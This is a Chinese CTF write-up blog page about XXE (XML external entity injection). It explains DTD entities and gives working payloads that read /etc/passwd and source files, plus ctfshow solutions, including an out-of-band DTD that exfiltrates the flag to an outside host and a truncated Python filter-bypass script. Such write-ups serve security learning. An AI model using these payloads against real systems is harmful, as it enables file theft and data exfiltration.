@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"qyzy.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="XML 文档结构 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 12345678910111213141516171819&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE">
+<meta property="og:url" content="https://qyzy.github.io/2023/08/07/XXE/index.html">
+<meta property="og:site_name" content="Welcome To QYZY&#39;s Blog">
+<meta property="og:description" content="XML 文档结构 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 12345678910111213141516171819&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &amp;l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qyzy.github.io/2023/08/07/XXE/image.png">
+<meta property="article:published_time" content="2023-08-07T13:49:05.000Z">
+<meta property="article:modified_time" content="2023-08-07T13:50:03.611Z">
+<meta property="article:author" content="竹云">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qyzy.github.io/2023/08/07/XXE/image.png">
+
+<link rel="canonical" href="https://qyzy.github.io/2023/08/07/XXE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XXE | Welcome To QYZY's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Welcome To QYZY's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/08/07/XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XXE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-07 21:49:05 / 修改时间：21:50:03" itemprop="dateCreated datePublished" datetime="2023-08-07T21:49:05+08:00">2023-08-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="xml">XML</h1>
+<h2 id="文档结构">文档结构</h2>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="dtd">DTD</h2>
+<ol type="1">
+<li>内部声明DTD： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>应用外部DTD： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>内外部DTD文档结合： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;DTD文件路径&quot;</span> [定义内容]&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>DTD中的一些重要的关键字： * DOCTYPE (DTD的声明) * ENTITY (实体的声明)
+* SYSTEM、PUBLIC (外部资源申请)</p>
+<blockquote>
+<p>PCDATA是被解析的字符数据，里面不应有&amp;,&lt;,&gt;字符，需要用内置实体代替</p>
+</blockquote>
+<blockquote>
+<p>CDATA是字符数据，不会被解析器解析，这些文本中的标签不会被当做标记，其中的实体也不会被展开。</p>
+</blockquote>
+<h2 id="实体类别介绍">实体类别介绍</h2>
+<p>实体主要分为以下四类 * 内置实体 * 字符实体 * 通用实体 * 参数实体</p>
+<p>参数实体用%实体名称申明，引用时也用%实体名称<br />
+其余实体直接用实体名称申明，使用时用&amp;实体名称<br />
+参数实体只能在DTD中申明，DTD中引用<br />
+其余实体只能在DTD中申明，可在xml文档中引入</p>
+<p>注意：<strong>参数实体是在DTD中被引用的，而其余实体是在xml文档中被引入的</strong></p>
+<h1 id="dtd实体声明">DTD实体声明</h1>
+<h2 id="内部实体声明">内部实体声明</h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 “实体的值”&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号
+(;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="外部实体声明">外部实体声明</h2>
+<p>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> “URI/URL”&gt;</span></span><br></pre></td></tr></table></figure>
+<p>示例： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xdsec</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">methodname</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span>(实体引用名) <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>(实体内容) &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>methodname</code>元素中，造成了敏感信息的泄露。</p>
+<h2 id="参数实体声明">参数实体声明</h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 “实体的值”&gt;</span></span><br><span class="line">or</span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>示例 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">%xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure> 外部evil.dtd中的内容。 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">evil</span> <span class="keyword">SYSTEM</span> “file:///c:/windows/win.ini” &gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="引用公共实体">引用公共实体</h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">PUBLIC</span> <span class="string">&quot;public_ID&quot;</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="xml外部实体攻击">XML外部实体攻击</h1>
+<p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。
+简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Code1：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [<span class="meta">&lt;!ENTITY <span class="keyword">passwd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;passwd;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Code2：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE b [<span class="meta">&lt;!ENTITY <span class="keyword">entityex</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///folder/file&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;entityex;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Code3：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="如何甄别一个xml实体攻击漏洞">如何甄别一个XML实体攻击漏洞</h1>
+<h2 id="xxe漏洞检测">XXE漏洞检测</h2>
+<p>第一步检测XML是否会被成功解析 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;my name is nMask&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure> 如果页面输出了my name is
+nMask，说明xml文件可以被解析。</p>
+<p>第二步检测服务器是否支持DTD引用外部实体： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/index.html&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%name; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="php代码层面">PHP代码层面</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  <span class="comment">//获取提交的XML数据</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);  <span class="comment">// 交给PHP的XML解析函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给xml变量。<br />
+这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
+<h1 id="例题">例题</h1>
+<h2 id="web373">web373</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
+<p>这里通过php的数据流获取xmlfile，然后进行解析，输出creds的ctfshow节点。我们直接写一个xml文件传进去，因为这里有回显，所以文件包含以后直接引用即可
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">payload</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">payload</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="web374-376">web374-376</h2>
+<p>在本地或服务器上开启web服务,将text.dtd放在web目录下， <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://xxx:12345/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>
+然后传入payload <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">aaa</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx/text.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>123<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+先请求我们的text.dtd,然后我们的dtd中会强制目标将flag的内容外带，给我们的web服务发送请求，这样我们就可以在日志中看到外带出的flag。</p>
+<h2 id="web377">web377</h2>
+<p>对http进行了过滤，但我们可以通过utf-16编码绕过 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6e07c613-d190-40c1-a22d-b8ee5f5569a3.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://45.76.194.53:8080/text.dtd&quot;&gt;</span></span><br><span class="line"><span 